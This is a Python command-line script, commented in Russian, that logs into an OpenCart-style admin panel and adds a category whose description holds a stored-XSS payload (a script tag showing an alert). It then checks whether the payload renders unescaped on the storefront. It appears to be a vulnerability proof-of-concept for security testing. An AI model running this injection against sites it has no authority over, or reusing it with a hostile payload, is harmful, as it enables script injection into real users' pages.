import click
import requests
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder


def open_session(url: str, admin_url: str, login: str, password: str) -> (requests.Session, str):
    """
    Открытие сессии для работы admin-dashboard

    :param url: str
    :param admin_url: str
    :param login: str
    :param password: str
    :return: requests.Session, string
    """
    session = requests.Session()
    multipart = MultipartEncoder(
        fields={
            'username': login,
            'password': password
        }
    )
    response = session.post(f'{url}/{admin_url}/index.php?route=common/login',
                            data=multipart,
                            headers={'Content-Type': multipart.content_type})
    if '/index.php?route=common/dashboard' not in response.url:
        exit('Wrong auth')

    return session, response.url.split('user_token=')[1]


def add_test_category(session: requests.Session, url: str, admin_url: str, user_token: str, payload: str):
    """
    Добавляем тестовую категорию с инъекцией на сайт

    :param session: requests.Session
    :param url: str
    :param admin_url: str
    :param user_token: str
    :param payload: str
    """
    click.echo('Adding test category with injection')
    # Если не указать какой-то из параметров запроса, результат не отображается на сайте
    multipart = MultipartEncoder(
        fields={
            'category_description[1][name]': 'Test',
            'category_description[1][description]': payload,
            'files': ('', '', 'application/octet-stream'),
            'file': ('', '', 'application/octet-stream'),
            'category_description[1][meta_title]': 'test',
            'category_description[1][meta_description]': '',  # Место, где, по-идее изначально вставлялся XSS
            'category_description[1][meta_keyword]': '',
            'path': '',
            'parent_id': '0',
            'filter': '',
            'category_store[]': '0',
            'image': '',
            'column': '1',
            'sort_order': '0',
            'status': '1',
            'category_seo_url[0][1]': '',
            'category_layout[0]': '',
        }
    )
    response = session.post(f'{url}/{admin_url}/index.php?route=catalog/category/add&user_token={user_token}',
                            data=multipart,
                            headers={'Content-Type': multipart.content_type})
    if response.status_code != 200:
        exit('Unable to add test category')

    click.echo('Test category added successfully')


def test_injection(session: requests.Session, url: str, payload: str):
    """
    Тестируем наличие инъекции

    :param session: requests.Session
    :param url: str
    :param payload: str
    """
    response = session.get(f'{url}/index.php?route=product/category')
    soup = BeautifulSoup(response.text, features="html.parser")
    category_url = soup.find('a', class_='list-group-item', string='Test (0)')['href']
    response = session.get(category_url)
    if payload in response.text:
        click.echo('Success')
    else:
        click.echo('Test Failed')


# Click используется для построение "человеческого" интерфейса
@click.command()
@click.option(
    '-u',
    '--url',
    prompt='Input URL of site to test to',
    type=str,
    help='URL of the main page of the site'
)
@click.option(
    '--custom-admin-path',
    type=str,
    help='URL of of an admin-panel',
    default='/admin'

)
@click.option(
    '-l',
    '--login',
    prompt='Username: ',
    type=str,
    help='Username of an admin'
)
@click.option(
    '-p',
    '--password',
    prompt='Password: ',
    type=str,
    help='Username of an admin',
    hide_input=True
)
def main(url, custom_admin_path, login, password):
    if url[-1] == '/':  # Избавляемся от ненужных слэшей
        url = url[:-1]
    custom_admin_path = custom_admin_path.replace('/', '')

    xss_payload = '<script>alert("Here\'s Johnny!")</script>'  # JS для инъекции

    session, user_token = open_session(url, custom_admin_path, login, password)  # Получем активную сессию и токен
    add_test_category(session, url, custom_admin_path, user_token, xss_payload)  # Добавляем категорию
    test_injection(session, url, xss_payload)  # Тестируем инъекцию


if __name__ == '__main__':
    try:
        main()
    except requests.exceptions.InvalidSchema:
        print('Invalid schema. Please add "http://" or "https://" to your address.')
